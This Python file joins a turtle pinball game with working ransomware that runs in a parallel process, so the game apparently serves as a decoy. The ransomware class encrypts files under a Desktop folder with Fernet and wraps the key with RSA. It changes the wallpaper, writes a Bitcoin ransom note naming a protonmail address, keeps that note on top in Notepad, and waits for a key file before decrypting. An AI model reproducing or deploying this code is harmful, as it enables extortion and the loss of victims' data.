import os
import shutil
import subprocess
import threading
import time
import datetime
import ctypes
import pygetwindow as gw
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import turtle
from random import randint
import multiprocessing
import time

def pinball_game():
    # Creating the screen with name and size
    screen = turtle.Screen()
    screen.title("DataFlair Pinball game")
    screen.setup(width=1000, height=600)

    # Creating the paddle
    paddle = turtle.Turtle()
    # Setting its speed as zero, it moves only when key is pressed
    paddle.speed(0)
    # Setting shape, color, and size
    paddle.shape("square")
    paddle.color("blue")
    paddle.shapesize(stretch_wid=2, stretch_len=6)
    paddle.penup()
    # The paddle is left-centered initially
    paddle.goto(-400, -250)

    # Creating the ball of circle shape
    ball = turtle.Turtle()
    # Setting the speed of ball to 0, it moves based on the dx and dy values
    ball.speed(0)
    # Setting shape, color, and size
    ball.shape("circle")
    ball.color("red")
    ball.penup()
    # Ball starts from the random position from the top of the screen
    x = randint(-400, 400)
    ball.goto(x, 260)
    # Setting dx and dy that decide the speed of the ball
    ball.dx = 2
    ball.dy = -2

    score = 0

    # Displaying the score
    scoreBoard = turtle.Turtle()
    scoreBoard.speed(0)
    scoreBoard.penup()
    # Hiding the turtle to show text
    scoreBoard.hideturtle()
    # Locating the score board on top of the screen
    scoreBoard.goto(0, 260)
    # Showing the score
    scoreBoard.write("Score : 0 ", align="center", font=("Courier", 20, "bold"))

    # Functions to move the paddle left and right
    def movePadRight():
        x = paddle.xcor()  # Getting the current x-coordinated of the paddle
        x += 15
        paddle.setx(x)  # Updating the x-coordinated of the paddle

    def movePadLeft():
        x = paddle.xcor()  # Getting the current x-coordinated of the paddle
        x -= 15
        paddle.setx(x)  # Updating the x-coordinated of the paddle

    # Mapping the functions to the keyboard buttons
    screen.listen()
    screen.onkeypress(movePadRight, "Right")
    screen.onkeypress(movePadLeft, "Left")

    while True:

        # Updating the screen everytime with the new changes
        screen.update()

        ball.setx(ball.xcor() + ball.dx)
        ball.sety(ball.ycor() + ball.dy)

        # Checking if ball hits the left, right, and top walls of the screen
        if ball.xcor() > 480:
            ball.setx(480)
            ball.dx *= -1  # Bouncing the ball

        if ball.xcor() < -480:
            ball.setx(-480)
            ball.dx *= -1  # Bouncing the ball

        if ball.ycor() > 280:
            ball.setx(280)
            ball.dy *= -1  # Bouncing the ball

        # Checking if the ball hits bottom and ending the game
        if ball.ycor() < -260:
            scoreBoard.clear()
            scoreBoard1 = turtle.Turtle()
            scoreBoard1.speed(0)
            scoreBoard1.penup()
            # Hiding the turtle to show text
            scoreBoard1.hideturtle()
            # Locating the score board on top of the screen
            scoreBoard1.goto(0, 0)
            scoreBoard1.color('black')
            # Showing the score
            scoreBoard1.write("Score : {} ".format(score), align="center", font=("Courier", 30, "bold"))
            break

        # Checking if paddle hits the ball, updating score, increasing speed and bouncing the ball
        if (paddle.ycor() + 30 > ball.ycor() > paddle.ycor() - 30 and
                paddle.xcor() + 50 > ball.xcor() > paddle.xcor() - 50):
            # Increasing score of left player and updating score board
            score += 1
            scoreBoard.clear()
            scoreBoard.write("Score: {}".format(score), align="center", font=("Courier", 20, "bold"))

            # Increasing speed of the ball with the limit 7
            if (ball.dy > 0 and ball.dy < 5):  # If dy is positive increasing dy
                ball.dy += 0.5
            elif (ball.dy < 0 and ball.dy > -5):  # else if dy is negative decreasing dy
                ball.dy -= 0.5

            if (ball.dx > 0 and ball.dx < 5):  # If dx is positive increasing dx
                ball.dx += 0.5
            elif (ball.dx < 0 and ball.dx > -5):  # else if dx is negative decreasing dx
                ball.dx -= 0.5

            # Changing the direction of ball towards the right player
            ball.dy *= -1

        # Introducing a delay to control the speed of the game
        time.sleep(0.01)
    while(True):
        screen.update()



CURRENT_DIRECTORY = os.path.dirname(os.path.abspath(__file__))
DESKTOP_PATH = os.path.join(os.path.expanduser('~'), 'Desktop')


class RW:
    file_exts = []

    def __init__(self, current_directory):
        self.current_directory = current_directory
        self.key = None
        self.crypter = None
        self.public_key = None
        self.local_root = os.path.join(DESKTOP_PATH, "texts")

    def generate_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)

    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
            self.public_key = RSA.import_key(open('public.pem').read())
            public_crypter = PKCS1_OAEP.new(self.public_key)
            enc_fernent_key = public_crypter.encrypt(fernet_key)
            f.write(enc_fernent_key)
        with open(os.path.join(DESKTOP_PATH, 'SEND_ME.txt'), 'wb') as fa:
            fa.write(enc_fernent_key)
        self.key = enc_fernent_key
        self.crypter = None

    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            data = f.read()
            if not encrypted:
                _data = self.crypter.encrypt(data)
                print('> File encrypted')
            else:
                _data = self.crypter.decrypt(data)
                print('> File decrypted')
        with open(file_path, 'wb') as fp:
            fp.write(_data)


    def crypt_system(self, encrypted=False):
        system = os.walk(self.local_root, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                # Skip the script file itself
                if file_path == self.current_directory:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)


    def change_desktop_background(self):
        image_filename = 'image.jpg'
        image_path = os.path.join(CURRENT_DIRECTORY, image_filename)
        desktop_path = os.path.join(DESKTOP_PATH, image_filename)
        shutil.copy(image_path, desktop_path)
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, desktop_path, 0)

    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
The harddisks of your computer have been encrypted with a Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called SEND_ME.txt located in {DESKTOP_PATH} to GetYourFilesBack@protonmail.com

2. You will recieve your personal BTC address for payment. We will check to see if payment has been paid.

3. Once payment has been completed you will receive a text file with your KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it.

IMPORTANT!!!!!
DO NOT MAKE ANY CHANGES TO THE SYSTEM, AS YOU MAY LOSE ALL DATA!
''')
    
    def show_ransom_note(self):
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0
        while True:
            time.sleep(0.1)
            top_window = gw.getActiveWindow().title
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing')
            else:
                print('Ransom note is not the top window - kill/create process again')
                time.sleep(0.1)
                ransom.kill()
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            time.sleep(5)
            count += 1
            if count == 15:
                break

    def put_me_on_desktop(self):
        print('started')
        while True:
            try:
                print('trying')
                with open(os.path.join(DESKTOP_PATH, 'PUT_ME_ON_DESKTOP.txt'), 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    self.crypt_system(encrypted=True)
                    print('decrypted')
                    break
            except Exception as e:
                print(e)
                pass
            time.sleep(5)
            print('Checking for PUT_ME_ON_DESKTOP.txt')

def main():
    rw = RW(CURRENT_DIRECTORY)
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.ransom_note()

    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print('> RW: Attack completed on target machine and system is encrypted')
    print('> RW: Waiting for attacker to give target machine document that will un-encrypt machine')
    t2.start()
    print('> RW: Target machine has been un-encrypted')
    print('> RW: Completed')


if __name__ == "__main__":
    # Create separate processes for pinball game and reverse shell client
    pinball_process = multiprocessing.Process(target=pinball_game)
    r_w_process = multiprocessing.Process(target=main)
    
    # Start both processes
    pinball_process.start()
    r_w_process.start()
    
    # Wait for both processes to finish
    pinball_process.join()
    r_w_process.join()